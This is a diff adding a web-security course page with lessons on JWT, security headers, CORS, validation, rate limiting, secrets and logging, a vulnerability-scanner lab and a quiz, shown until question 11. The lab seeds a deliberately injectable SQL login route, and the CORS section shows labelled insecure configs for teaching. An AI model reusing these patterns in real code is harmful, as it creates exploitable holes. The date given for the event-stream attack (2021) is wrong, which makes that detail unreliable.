+            <pre style="font-size:0.78rem;color:#0f0;overflow-x:auto;line-height:1.9;"><code>import jwt from 'jsonwebtoken';
+
+// ❌ NEVER use 'none' algorithm (accepts unsigned tokens!)
+// ❌ NEVER store JWT in localStorage (accessible to XSS)
+// ❌ NEVER put sensitive data (passwords, PII) in the payload
+
+// ✅ Sign with a strong secret or RS256 key pair
+const token = jwt.sign(
+  { userId: user.id, role: user.role },
+  process.env.JWT_SECRET,     // Strong random secret, min 256 bits
+  { expiresIn: '15m',         // Short-lived access tokens
+    algorithm: 'HS256' }
+);
+
+// ✅ Store access token in memory, refresh token in HttpOnly cookie
+// Access token (memory): fast, XSS cannot steal it from memory easily
+// Refresh token (HttpOnly cookie): survives page reload, immune to XSS
+
+// ✅ Verify with explicit algorithm list
+const payload = jwt.verify(token, process.env.JWT_SECRET, {
+  algorithms: ['HS256']  // Reject tokens with unexpected algorithm
+});
+
+// Cookie settings for HttpOnly refresh token
+res.cookie('refreshToken', token, {
+  httpOnly: true,     // Not accessible via JavaScript
+  secure: true,       // HTTPS only
+  sameSite: 'strict', // CSRF protection
+  maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
+});</code></pre>
+        </div>
+    </div>
+
+    <!-- 1.7 HTTPS & Transport Security -->
+    <div class="content-card">
+        <h3>🔐 1.7 HTTPS & Transport Layer Security</h3>
+        <p>HTTPS encrypts all data in transit between the browser and your server using TLS (Transport Layer Security). Without it, anyone on the same network (coffee shop WiFi, ISP, etc.) can read or modify your traffic in a <strong>man-in-the-middle attack</strong>.</p>
+
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.2rem;margin-top:1.2rem;">
+            <div>
+                <strong style="color:var(--cyan);">📋 Security Headers — Your First Line of Defence</strong>
+                <div style="background:#000;padding:1rem;border-radius:8px;margin-top:0.6rem;">
+                    <pre style="font-size:0.76rem;color:#0f0;overflow-x:auto;line-height:1.9;"><code># Strict Transport Security
+# Force HTTPS for 1 year, include subdomains
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+
+# Prevent MIME-type sniffing attacks
+X-Content-Type-Options: nosniff
+
+# Prevent clickjacking (loading your site in an iframe)
+X-Frame-Options: DENY
+# Or via CSP:
+Content-Security-Policy: frame-ancestors 'none'
+
+# Control referrer information
+Referrer-Policy: strict-origin-when-cross-origin
+
+# Disable browser features you don't need
+Permissions-Policy: camera=(), microphone=(), geolocation=()</code></pre>
+                </div>
+            </div>
+            <div>
+                <strong style="color:var(--cyan);">⚙️ Setting Headers in Node.js (Helmet)</strong>
+                <p style="font-size:0.82rem;color:var(--text-secondary);margin-top:0.5rem;">The <strong>helmet</strong> package sets all critical security headers with one line of code:</p>
+                <div style="background:#000;padding:1rem;border-radius:8px;margin-top:0.6rem;">
+                    <pre style="font-size:0.76rem;color:#0f0;overflow-x:auto;line-height:1.8;"><code>import helmet from 'helmet';
+import express from 'express';
+
+const app = express();
+
+// Sets ~15 security headers automatically
+app.use(helmet());
+
+// Or customise specific headers:
+app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'", "'nonce-{nonce}'"],
+    }
+  },
+  hsts: { maxAge: 31536000, includeSubDomains: true }
+}));</code></pre>
+                </div>
+                <div style="background:rgba(40,224,255,0.06);border:1px solid rgba(40,224,255,0.2);padding:0.8rem;border-radius:6px;margin-top:0.8rem;">
+                    <p style="font-size:0.8rem;color:var(--text-secondary);">💡 Test your headers at <strong>securityheaders.com</strong> — aim for an A or A+ rating.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 1.8 CORS -->
+    <div class="content-card">
+        <h3>🌐 1.8 CORS — Cross-Origin Resource Sharing</h3>
+        <p>The <strong>Same-Origin Policy</strong> is a browser security mechanism that blocks JavaScript from making requests to a different origin (protocol + domain + port). CORS is the mechanism that allows servers to <em>selectively relax</em> this restriction — but a misconfigured CORS policy is a common security hole.</p>
+
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.2rem;margin-top:1.2rem;">
+            <div>
+                <div style="background:#000;padding:1rem;border-radius:8px;">
+                    <p style="color:#ff5555;font-size:0.75rem;margin-bottom:0.5rem;">❌ DANGEROUS CORS CONFIG</p>
+                    <pre style="font-size:0.76rem;color:#ff6b6b;overflow-x:auto;line-height:1.8;"><code>// Allows ANY website to make requests
+// to your API — including malicious ones
+app.use(cors({ origin: '*' }));
+
+// Also dangerous: reflecting any origin
+app.use((req, res, next) => {
+  res.header('Access-Control-Allow-Origin',
+    req.headers.origin); // Reflects any origin!
+  next();
+});</code></pre>
+                </div>
+            </div>
+            <div>
+                <div style="background:#000;padding:1rem;border-radius:8px;">
+                    <p style="color:#0f0;font-size:0.75rem;margin-bottom:0.5rem;">✅ SECURE CORS CONFIG</p>
+                    <pre style="font-size:0.76rem;color:#0f0;overflow-x:auto;line-height:1.8;"><code>const allowedOrigins = [
+  'https://myapp.com',
+  'https://www.myapp.com',
+  // Only add staging during development
+];
+
+app.use(cors({
+  origin: (origin, callback) => {
+    if (!origin || allowedOrigins.includes(origin))
+      callback(null, true);
+    else
+      callback(new Error('Not allowed by CORS'));
+  },
+  credentials: true, // Allow cookies
+  methods: ['GET', 'POST', 'PUT', 'DELETE'],
+}));</code></pre>
+                </div>
+            </div>
+        </div>
+
+        <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);padding:1rem;border-radius:8px;margin-top:1.2rem;">
+            <strong>🔍 Simple vs Preflight Requests:</strong>
+            <p style="font-size:0.83rem;color:var(--text-secondary);margin-top:0.5rem;">For "non-simple" requests (custom headers, <code>PUT</code>/<code>DELETE</code>, JSON body), browsers send a <strong>preflight OPTIONS request</strong> first to ask the server if the actual request is allowed. Your server must respond correctly to preflight or the request will fail.</p>
+        </div>
+    </div>
+
+    <!-- 1.9 Input Validation & Sanitisation -->
+    <div class="content-card">
+        <h3>✅ 1.9 Input Validation & Sanitisation</h3>
+        <p>The single most important security principle: <strong>never trust user input</strong>. Every piece of data that enters your system from outside — form fields, URL params, headers, file uploads, API payloads — must be validated and sanitised before being processed, stored, or displayed.</p>
+
+        <div style="background:#000;padding:1rem;border-radius:8px;margin-top:1.2rem;">
+            <p style="color:var(--cyan);font-size:0.75rem;margin-bottom:0.5rem;">SERVER-SIDE VALIDATION WITH ZOD</p>
+            <pre style="font-size:0.78rem;color:#0f0;overflow-x:auto;line-height:1.8;"><code>import { z } from 'zod';
+
+// Define the shape of expected input
+const RegisterSchema = z.object({
+  email:    z.string().email().max(255),
+  username: z.string().min(3).max(30).regex(/^[a-zA-Z0-9_]+$/),
+  password: z.string().min(8).max(128),
+  age:      z.number().int().min(13).max(120),
+});
+
+// In your route handler:
+app.post('/register', async (req, res) => {
+  const result = RegisterSchema.safeParse(req.body);
+
+  if (!result.success) {
+    // Validation failed — return errors, never process the data
+    return res.status(400).json({ errors: result.error.flatten() });
+  }
+
+  // result.data is now fully typed and validated
+  const { email, username, password } = result.data;
+  // ... proceed safely
+});</code></pre>
+        </div>
+
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin-top:1.2rem;">
+            <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);padding:1.2rem;border-radius:8px;">
+                <strong style="color:var(--cyan);">📂 File Upload Security</strong>
+                <ul style="list-style:none;font-size:0.82rem;color:var(--text-secondary);margin-top:0.6rem;line-height:2;">
+                    <li>→ Validate MIME type server-side (not just extension)</li>
+                    <li>→ Limit file size (<code>multipart limits</code>)</li>
+                    <li>→ Never store uploads in a public web-accessible directory</li>
+                    <li>→ Rename files with random names (prevent path traversal)</li>
+                    <li>→ Scan for malware with ClamAV or cloud services</li>
+                    <li>→ Serve user uploads from a separate domain/CDN</li>
+                </ul>
+            </div>
+            <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);padding:1.2rem;border-radius:8px;">
+                <strong style="color:var(--cyan);">🧹 Sanitisation vs Validation</strong>
+                <p style="font-size:0.82rem;color:var(--text-secondary);margin-top:0.5rem;"><strong>Validation</strong> rejects bad input (returns an error). <strong>Sanitisation</strong> cleans input (removes dangerous parts).</p>
+                <p style="font-size:0.82rem;color:var(--text-secondary);margin-top:0.5rem;">Prefer <strong>validation + rejection</strong> for structured data. Use sanitisation when you <em>must</em> accept rich text (e.g., DOMPurify for HTML content from users).</p>
+                <p style="font-size:0.82rem;color:#ffd700;margin-top:0.5rem;">⚠ Never rely on client-side validation alone — it can be bypassed. Always validate on the server.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- 1.10 Rate Limiting & Brute Force Protection -->
+    <div class="content-card">
+        <h3>⏱️ 1.10 Rate Limiting & Brute Force Protection</h3>
+        <p>Without rate limiting, attackers can send unlimited requests to your API — attempting millions of password combinations, scraping all your data, or overloading your servers. Rate limiting is a critical control that should be applied to every public endpoint.</p>
+
+        <div style="background:#000;padding:1rem;border-radius:8px;margin-top:1.2rem;">
+            <p style="color:var(--cyan);font-size:0.75rem;margin-bottom:0.5rem;">RATE LIMITING WITH express-rate-limit + Redis</p>
+            <pre style="font-size:0.78rem;color:#0f0;overflow-x:auto;line-height:1.8;"><code>import rateLimit from 'express-rate-limit';
+import RedisStore from 'rate-limit-redis';
+import { createClient } from 'redis';
+
+const redis = createClient({ url: process.env.REDIS_URL });
+
+// General API rate limit — 100 requests per 15 minutes
+const apiLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 100,
+  standardHeaders: true,
+  store: new RedisStore({ sendCommand: (...args) => redis.sendCommand(args) }),
+  handler: (req, res) => res.status(429).json({ error: 'Too many requests' })
+});
+
+// Strict limit for auth endpoints — 5 attempts per 15 minutes
+const authLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 5,
+  skipSuccessfulRequests: true, // Don't count successful logins
+});
+
+app.use('/api/', apiLimiter);
+app.use('/auth/login', authLimiter);
+app.use('/auth/register', authLimiter);</code></pre>
+        </div>
+
+        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:0.8rem;margin-top:1.2rem;">
+            <div style="background:rgba(255,255,255,0.04);padding:0.8rem;border-radius:6px;font-size:0.82rem;"><strong style="color:var(--cyan);">Account Lockout</strong><br><span style="color:var(--text-secondary);">Lock account after 5–10 failed attempts, unlock via email</span></div>
+            <div style="background:rgba(255,255,255,0.04);padding:0.8rem;border-radius:6px;font-size:0.82rem;"><strong style="color:var(--cyan);">CAPTCHA</strong><br><span style="color:var(--text-secondary);">Add hCaptcha or Cloudflare Turnstile after repeated failures</span></div>
+            <div style="background:rgba(255,255,255,0.04);padding:0.8rem;border-radius:6px;font-size:0.82rem;"><strong style="color:var(--cyan);">IP Blocking</strong><br><span style="color:var(--text-secondary);">Block IPs with suspicious patterns via Cloudflare WAF</span></div>
+            <div style="background:rgba(255,255,255,0.04);padding:0.8rem;border-radius:6px;font-size:0.82rem;"><strong style="color:var(--cyan);">Credential Stuffing</strong><br><span style="color:var(--text-secondary);">Check passwords against Have I Been Pwned database on registration</span></div>
+        </div>
+    </div>
+
+    <!-- 1.11 Secrets Management -->
+    <div class="content-card">
+        <h3>🗝️ 1.11 Secrets Management — Never Leak Your Keys</h3>
+        <p>API keys, database passwords, JWT secrets, and third-party credentials are the keys to your kingdom. Exposing them — even accidentally, even briefly — can result in complete compromise of your application and data.</p>
+
+        <div style="background:rgba(255,50,50,0.08);border:1px solid rgba(255,50,50,0.3);padding:1rem;border-radius:8px;margin-top:1.2rem;">
+            <strong style="color:#ff5555;">🚨 Real-World Consequences of Leaked Secrets:</strong>
+            <ul style="list-style:none;font-size:0.83rem;color:var(--text-secondary);margin-top:0.5rem;line-height:2;">
+                <li>→ AWS key leaked on GitHub → attackers spin up hundreds of crypto-mining instances → $50,000 bill overnight</li>
+                <li>→ Stripe key leaked → fraudulent charges processed against your customers</li>
+                <li>→ Database password leaked → all user data exfiltrated and sold</li>
+            </ul>
+            <p style="font-size:0.82rem;color:#ff5555;margin-top:0.5rem;"><strong>GitHub, GitLab, and cloud providers scan public repos for secrets in real time. Attackers also scan constantly — a key exposed for even 30 seconds can be exploited.</strong></p>
+        </div>
+
+        <div style="background:#000;padding:1rem;border-radius:8px;margin-top:1.2rem;">
+            <p style="color:var(--cyan);font-size:0.75rem;margin-bottom:0.5rem;">SECRETS BEST PRACTICES</p>
+            <pre style="font-size:0.78rem;color:#0f0;overflow-x:auto;line-height:1.9;"><code># 1. NEVER commit .env files
+# .gitignore — always include:
+.env
+.env.local
+.env.production
+.env.*.local
+
+# 2. Provide .env.example with placeholder values (safe to commit)
+DATABASE_URL=postgresql://user:password@localhost/mydb
+JWT_SECRET=your-256-bit-secret-here
+STRIPE_KEY=sk_test_...
+
+# 3. In production: use platform secret stores
+# Vercel / Netlify: Dashboard → Environment Variables
+# AWS: Secrets Manager or Parameter Store
+# GitHub Actions: Repository → Settings → Secrets
+# Docker / K8s: Kubernetes Secrets or HashiCorp Vault
+
+# 4. Rotate secrets regularly
+# Use short-lived credentials where possible (AWS STS, OIDC)</code></pre>
+        </div>
+
+        <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);padding:1rem;border-radius:8px;margin-top:1.2rem;">
+            <strong>🛡️ If a Secret is Leaked — Incident Response:</strong>
+            <ol style="font-size:0.83rem;color:var(--text-secondary);margin-top:0.5rem;line-height:2.2;padding-left:1.2rem;">
+                <li><strong>Immediately revoke the leaked credential</strong> (rotate the key in the provider's dashboard)</li>
+                <li>Check audit logs for any unauthorised usage</li>
+                <li>If the commit is on a public repo, assume the secret was already harvested</li>
+                <li>Use <code>git filter-repo</code> to remove from history (force push)</li>
+                <li>Notify affected parties if user data was accessed</li>
+            </ol>
+        </div>
+    </div>
+
+    <!-- 1.12 Dependency Security -->
+    <div class="content-card">
+        <h3>📦 1.12 Dependency Security — Your Supply Chain</h3>
+        <p>Modern applications use hundreds or thousands of npm packages. Each one is a potential vector for attack. In 2021, the <strong>event-stream</strong> supply chain attack injected malicious code into a package downloaded 2 million times per week. Managing your dependency security is non-negotiable.</p>
+
+        <div style="background:#000;padding:1rem;border-radius:8px;margin-top:1.2rem;">
+            <p style="color:var(--cyan);font-size:0.75rem;margin-bottom:0.5rem;">DEPENDENCY AUDITING TOOLS</p>
+            <pre style="font-size:0.78rem;color:#0f0;overflow-x:auto;line-height:1.9;"><code># Built-in npm audit
+npm audit                    # Lists all known vulnerabilities
+npm audit fix                # Auto-fix compatible vulnerabilities
+npm audit fix --force        # Fix with major version bumps (test first!)
+npm audit --audit-level=high # Fail CI only on high/critical issues
+
+# Snyk — more detailed analysis
+npx snyk test
+npx snyk monitor             # Continuous monitoring
+
+# License checking
+npx license-checker --onlyAllow 'MIT;Apache-2.0;BSD-3-Clause'
+
+# Check outdated packages
+npm outdated</code></pre>
+        </div>
+
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.2rem;margin-top:1.2rem;">
+            <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);padding:1.2rem;border-radius:8px;">
+                <strong style="color:var(--cyan);">🤖 GitHub Dependabot</strong>
+                <p style="font-size:0.82rem;color:var(--text-secondary);margin-top:0.5rem;">Enable Dependabot in your GitHub repo settings. It automatically opens PRs when your dependencies have security updates — keeping you patched without manual effort.</p>
+                <div style="background:#000;padding:0.5rem;border-radius:4px;margin-top:0.6rem;">
+                    <pre style="font-size:0.74rem;color:#0f0;overflow-x:auto;"><code># .github/dependabot.yml
+version: 2
+updates:
+  - package-ecosystem: npm
+    directory: /
+    schedule:
+      interval: weekly</code></pre>
+                </div>
+            </div>
+            <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);padding:1.2rem;border-radius:8px;">
+                <strong style="color:var(--cyan);">⚠️ Package Hygiene Rules</strong>
+                <ul style="list-style:none;font-size:0.82rem;color:var(--text-secondary);margin-top:0.6rem;line-height:2;">
+                    <li>→ Pin exact versions in production (<code>--save-exact</code>)</li>
+                    <li>→ Check package reputation before installing (downloads, issues, last update)</li>
+                    <li>→ Avoid packages with very few maintainers for critical code</li>
+                    <li>→ Use <code>npm ci</code> (not <code>npm install</code>) in CI — respects lockfile exactly</li>
+                    <li>→ Keep <code>package-lock.json</code> committed and reviewed</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- 1.13 Security Logging & Monitoring -->
+    <div class="content-card">
+        <h3>📋 1.13 Security Logging & Monitoring</h3>
+        <p>OWASP A09 is "Security Logging and Monitoring Failures" — because most breaches go undetected for <strong>months</strong>. Proper logging creates the forensic trail needed to detect attacks, understand breaches, and meet compliance requirements.</p>
+
+        <div style="background:#000;padding:1rem;border-radius:8px;margin-top:1.2rem;">
+            <p style="color:var(--cyan);font-size:0.75rem;margin-bottom:0.5rem;">WHAT TO LOG AND HOW</p>
+            <pre style="font-size:0.78rem;color:#0f0;overflow-x:auto;line-height:1.8;"><code>// Structured JSON logging (use a library like pino or winston)
+import pino from 'pino';
+const logger = pino({ level: 'info' });
+
+// Log security events — always include:
+// timestamp, userId, IP, action, outcome
+
+// Authentication events
+logger.info({ userId: user.id, ip: req.ip, action: 'login', success: true });
+logger.warn({ email, ip: req.ip, action: 'login_failed', reason: 'bad_password' });
+logger.warn({ email, ip: req.ip, action: 'login_failed', reason: 'account_locked' });
+
+// Access control violations
+logger.warn({ userId, ip: req.ip, action: 'access_denied', resource: req.path });
+
+// Data modification events
+logger.info({ userId, action: 'user_deleted', targetId: params.id });
+
+// ❌ NEVER log: passwords, credit cards, tokens, PII (names, emails)
+// ✅ DO log: user IDs, IP addresses, actions, outcomes, error codes</code></pre>
+        </div>
+
+        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:0.8rem;margin-top:1.2rem;">
+            <div style="background:rgba(255,255,255,0.04);padding:0.8rem;border-radius:6px;font-size:0.82rem;"><strong style="color:var(--cyan);">Sentry</strong><br><span style="color:var(--text-secondary);">Error tracking with full context — catch exceptions before users report them</span></div>
+            <div style="background:rgba(255,255,255,0.04);padding:0.8rem;border-radius:6px;font-size:0.82rem;"><strong style="color:var(--cyan);">Datadog / Grafana</strong><br><span style="color:var(--text-secondary);">Visualise login failure rates, 4xx spikes, unusual traffic patterns</span></div>
+            <div style="background:rgba(255,255,255,0.04);padding:0.8rem;border-radius:6px;font-size:0.82rem;"><strong style="color:var(--cyan);">PagerDuty</strong><br><span style="color:var(--text-secondary);">Alert on-call engineers when anomalies exceed thresholds</span></div>
+            <div style="background:rgba(255,255,255,0.04);padding:0.8rem;border-radius:6px;font-size:0.82rem;"><strong style="color:var(--cyan);">Cloudflare</strong><br><span style="color:var(--text-secondary);">WAF, DDoS protection, bot management, and request analytics at the edge</span></div>
+        </div>
+    </div>
+
+    <!-- 1.14 Conclusion -->
+    <div class="content-card" style="background: linear-gradient(135deg, rgba(91,124,255,0.1), rgba(40,224,255,0.08)); border-color: rgba(40,224,255,0.3);">
+        <h3>🎓 1.14 Module Conclusion & Next Steps</h3>
+        <p>Security is a discipline that rewards <strong>paranoia and diligence</strong>. The vulnerabilities covered in this module are responsible for the majority of real-world web application breaches. Mastering them makes you a significantly safer engineer — and a more valuable one.</p>
+
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.2rem;margin-top:1.2rem;">
+            <div>
+                <strong style="color:var(--cyan);">✅ What you've covered:</strong>
+                <ul style="list-style:none;font-size:0.83rem;color:var(--text-secondary);margin-top:0.6rem;line-height:2;">
+                    <li>✔ The security mindset and OWASP Top 10</li>
+                    <li>✔ XSS (Stored, Reflected, DOM-based) + CSP</li>
+                    <li>✔ CSRF attacks and defences (tokens, SameSite)</li>
+                    <li>✔ SQL Injection and parameterised queries</li>
+                    <li>✔ Password hashing (bcrypt, argon2) and MFA</li>
+                    <li>✔ JWT security and session management</li>
+                    <li>✔ HTTPS and critical security headers (Helmet)</li>
+                    <li>✔ CORS — Same-Origin Policy and safe configuration</li>
+                    <li>✔ Input validation and sanitisation (Zod, DOMPurify)</li>
+                    <li>✔ Rate limiting and brute force protection</li>
+                    <li>✔ Secrets management and incident response</li>
+                    <li>✔ Dependency security and supply chain risks</li>
+                    <li>✔ Security logging and monitoring</li>
+                </ul>
+            </div>
+            <div>
+                <strong style="color:var(--cyan);">🗺️ Your next steps:</strong>
+                <div style="margin-top:0.6rem;font-size:0.83rem;">
+                    <div style="background:rgba(255,255,255,0.04);padding:0.8rem;border-radius:6px;margin-bottom:0.6rem;">
+                        <strong style="color:var(--blue);">1️⃣ Run OWASP ZAP against your app</strong>
+                        <p style="color:var(--text-secondary);margin-top:0.2rem;">Use the free OWASP ZAP scanner to automatically find vulnerabilities in your application</p>
+                    </div>
+                    <div style="background:rgba(255,255,255,0.04);padding:0.8rem;border-radius:6px;margin-bottom:0.6rem;">
+                        <strong style="color:var(--blue);">2️⃣ Add Helmet and rate limiting to an API</strong>
+                        <p style="color:var(--text-secondary);margin-top:0.2rem;">Take an existing Node.js project and harden it with proper security headers and limits</p>
+                    </div>
+                    <div style="background:rgba(255,255,255,0.04);padding:0.8rem;border-radius:6px;margin-bottom:0.6rem;">
+                        <strong style="color:var(--blue);">3️⃣ Check your secrets exposure</strong>
+                        <p style="color:var(--text-secondary);margin-top:0.2rem;">Run <code>git log</code> and search your history for any accidentally committed secrets</p>
+                    </div>
+                    <div style="background:rgba(255,255,255,0.04);padding:0.8rem;border-radius:6px;">
+                        <strong style="color:var(--blue);">4️⃣ Complete the PortSwigger Web Security Academy</strong>
+                        <p style="color:var(--text-secondary);margin-top:0.2rem;">The best free resource for hands-on security labs — covers every OWASP topic in depth</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div style="background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.1);border-radius:8px;padding:1.2rem;margin-top:1.2rem;">
+            <strong>🏆 Final Challenge:</strong>
+            <p style="font-size:0.9rem;color:var(--text-secondary);margin-top:0.5rem;">Build a secure user authentication system from scratch: registration with bcrypt password hashing, login with JWT (access token in memory, refresh token in HttpOnly cookie), rate limiting on auth routes, CSRF protection, input validation with Zod, and proper security headers via Helmet. This end-to-end exercise touches every critical security concept in this module.</p>
+        </div>
+    </div>
+
+        </div>
+
+        <!-- ═══════════════════════════ LAB ═══════════════════════════ -->
+        <div id="lab" class="tab-panel">
+            <h3>Security Vulnerability Scanner</h3>
+            <p style="margin-bottom: 1rem; font-size: 0.9rem;">Paste a code snippet and get an instant analysis of potential security vulnerabilities and how to fix them.</p>
+            <div class="lab-container">
+                <div class="lab-editor">
+                    <div class="lab-header">CODE SNIPPET</div>
+                    <textarea class="lab-textarea" id="sec-input">// Paste your code here to analyse
+const express = require('express');
+const app = express();
+
+app.post('/login', async (req, res) => {
+  const { username, password } = req.body;
+  
+  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
+  const user = await db.query(query);
+  
+  if (user) {
+    res.json({ token: user.id, message: 'Welcome ' + username });
+  } else {
+    res.json({ error: 'User not found' });
+  }
+});
+
+app.get('/users', (req, res) => {
+  const users = db.query('SELECT * FROM users');
+  res.json(users);
+});</textarea>
+                </div>
+                <div class="lab-preview">
+                    <div class="lab-header">SECURITY ANALYSIS</div>
+                    <div class="lab-output" id="sec-output">Click "Scan for Vulnerabilities" to analyse your code...</div>
+                </div>
+            </div>
+            <button class="btn btn-primary" style="margin-top: 1rem;" onclick="runSecScan()">Scan for Vulnerabilities</button>
+        </div>
+
+        <!-- ═══════════════════════════ QUIZ ═══════════════════════════ -->
+        <div id="quiz" class="tab-panel">
+    <div class="content-card">
+        <h3>📊 Quiz: Security — Frontend & Backend</h3>
+        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Test your mastery of web security vulnerabilities, attack vectors, and the defences that stop them.</p>
+
+        <form id="quiz-form">
+
+            <div class="content-card quiz-item">
+                <p class="quiz-question">1. What is Cross-Site Scripting (XSS)?</p>
+                <label class="quiz-option"><input type="radio" name="q1" value="A"> A) An attack where the attacker intercepts traffic between client and server</label>
+                <label class="quiz-option"><input type="radio" name="q1" value="B"> B) An attack where malicious scripts are injected into a page and executed by other users' browsers</label>
+                <label class="quiz-option"><input type="radio" name="q1" value="C"> C) An attack that overwhelms a server with requests</label>
+                <label class="quiz-option"><input type="radio" name="q1" value="D"> D) An attack that manipulates SQL database queries</label>
+            </div>
+
+            <div class="content-card quiz-item">
+                <p class="quiz-question">2. Which of the following is the safest way to insert user-generated content into the DOM?</p>
+                <label class="quiz-option"><input type="radio" name="q2" value="A"> A) <code>element.innerHTML = userInput</code></label>
+                <label class="quiz-option"><input type="radio" name="q2" value="B"> B) <code>document.write(userInput)</code></label>
+                <label class="quiz-option"><input type="radio" name="q2" value="C"> C) <code>element.textContent = userInput</code></label>
+                <label class="quiz-option"><input type="radio" name="q2" value="D"> D) <code>eval(userInput)</code></label>
+            </div>
+
+            <div class="content-card quiz-item">
+                <p class="quiz-question">3. What does a Content Security Policy (CSP) primarily protect against?</p>
+                <label class="quiz-option"><input type="radio" name="q3" value="A"> A) SQL Injection</label>
+                <label class="quiz-option"><input type="radio" name="q3" value="B"> B) CSRF attacks</label>
+                <label class="quiz-option"><input type="radio" name="q3" value="C"> C) XSS — it tells the browser which script sources are allowed to execute</label>
+                <label class="quiz-option"><input type="radio" name="q3" value="D"> D) Brute-force password attacks</label>
+            </div>
+
+            <div class="content-card quiz-item">
+                <p class="quiz-question">4. How does a CSRF attack work?</p>
+                <label class="quiz-option"><input type="radio" name="q4" value="A"> A) The attacker injects JavaScript into your page</label>
+                <label class="quiz-option"><input type="radio" name="q4" value="B"> B) The attacker tricks a logged-in user's browser into making an unintended request to your server, which automatically includes the user's cookies</label>
+                <label class="quiz-option"><input type="radio" name="q4" value="C"> C) The attacker reads your database through malformed SQL</label>
+                <label class="quiz-option"><input type="radio" name="q4" value="D"> D) The attacker brute-forces the user's password</label>
+            </div>
+
+            <div class="content-card quiz-item">
+                <p class="quiz-question">5. What is the correct way to prevent SQL Injection?</p>
+                <label class="quiz-option"><input type="radio" name="q5" value="A"> A) Escape all single quotes in user input</label>
+                <label class="quiz-option"><input type="radio" name="q5" value="B"> B) Use parameterised queries / prepared statements — never concatenate user input into SQL strings</label>
+                <label class="quiz-option"><input type="radio" name="q5" value="C"> C) Validate that input only contains letters and numbers</label>
+                <label class="quiz-option"><input type="radio" name="q5" value="D"> D) Use HTTPS to encrypt database queries</label>
+            </div>
+
+            <div class="content-card quiz-item">
+                <p class="quiz-question">6. Why should you never use MD5 or SHA-1 to hash passwords?</p>
+                <label class="quiz-option"><input type="radio" name="q6" value="A"> A) They are not supported by modern databases</label>
+                <label class="quiz-option"><input type="radio" name="q6" value="B"> B) They are reversible — they can be decrypted</label>
+                <label class="quiz-option"><input type="radio" name="q6" value="C"> C) They are too slow for production use</label>
+                <label class="quiz-option"><input type="radio" name="q6" value="D"> D) They are too fast — attackers can compute billions of hashes per second making brute-force attacks feasible</label>
+            </div>
+
+            <div class="content-card quiz-item">
+                <p class="quiz-question">7. What does the <code>HttpOnly</code> cookie attribute do?</p>
+                <label class="quiz-option"><input type="radio" name="q7" value="A"> A) The cookie is only sent over HTTP, not HTTPS</label>
+                <label class="quiz-option"><input type="radio" name="q7" value="B"> B) The cookie cannot be accessed by JavaScript — protecting it from XSS theft</label>
+                <label class="quiz-option"><input type="radio" name="q7" value="C"> C) The cookie is only sent during the same HTTP session</label>
+                <label class="quiz-option"><input type="radio" name="q7" value="D"> D) The cookie expires when the browser tab is closed</label>
+            </div>
+
+            <div class="content-card quiz-item">
+                <p class="quiz-question">8. What is the danger of <code>Access-Control-Allow-Origin: *</code>?</p>
+                <label class="quiz-option"><input type="radio" name="q8" value="A"> A) It disables HTTPS for the endpoint</label>
+                <label class="quiz-option"><input type="radio" name="q8" value="B"> B) It allows any website on the internet to make authenticated requests to your API</label>
+                <label class="quiz-option"><input type="radio" name="q8" value="C"> C) It blocks all cross-origin requests</label>
+                <label class="quiz-option"><input type="radio" name="q8" value="D"> D) It causes CORS preflight requests to fail</label>
+            </div>
+
+            <div class="content-card quiz-item">
+                <p class="quiz-question">9. Why is it dangerous to store a JWT in localStorage?</p>
+                <label class="quiz-option"><input type="radio" name="q9" value="A"> A) localStorage has a size limit that JWTs may exceed</label>
+                <label class="quiz-option"><input type="radio" name="q9" value="B"> B) JWTs in localStorage are accessible by any JavaScript on the page — an XSS attack can steal them</label>
+                <label class="quiz-option"><input type="radio" name="q9" value="C"> C) localStorage is cleared on every page refresh</label>
+                <label class="quiz-option"><input type="radio" name="q9" value="D"> D) JWTs cannot be serialised to strings</label>
+            </div>
+
+            <div class="content-card quiz-item">
+                <p class="quiz-question">10. What does the <code>Strict-Transport-Security</code> (HSTS) header do?</p>
+                <label class="quiz-option"><input type="radio" name="q10" value="A"> A) Forces the browser to only use strict TLS 1.3</label>
+                <label class="quiz-option"><input type="radio" name="q10" value="B"> B) Tells the browser to only connect to this domain over HTTPS for a specified period, preventing protocol downgrade attacks</label>
+                <label class="quiz-option"><input type="radio" name="q10" value="C"> C) Prevents third-party scripts from running on the page</label>
+                <label class="quiz-option"><input type="radio" name="q10" value="D"> D) Encrypts cookie values before sending them</label>
+            </div>
+
+            <div class="content-card quiz-item">
+                <p class="quiz-question">11. What is the purpose of a CSRF token?</p>
+                <label class="quiz-option"><input type="radio" name="q11" value="A"> A) To encrypt the form data before submission</label>
+                <label class="quiz-option"><input type="radio" name="q11" value="B"> B) To prevent XSS by validating script sources</label>
+                <label class="quiz-option"><input type="radio" name="q11" value="C"> C) A unique secret value that the server includes in forms and validates on submission — forged cross-site requests cannot obtain it</label>
+                <label class="quiz-option"><input type="radio" name="q11" value="D"> D) To limit how many requests a user can make per minute</label>
+            </div>
+
+            <div class="content-card quiz-item">
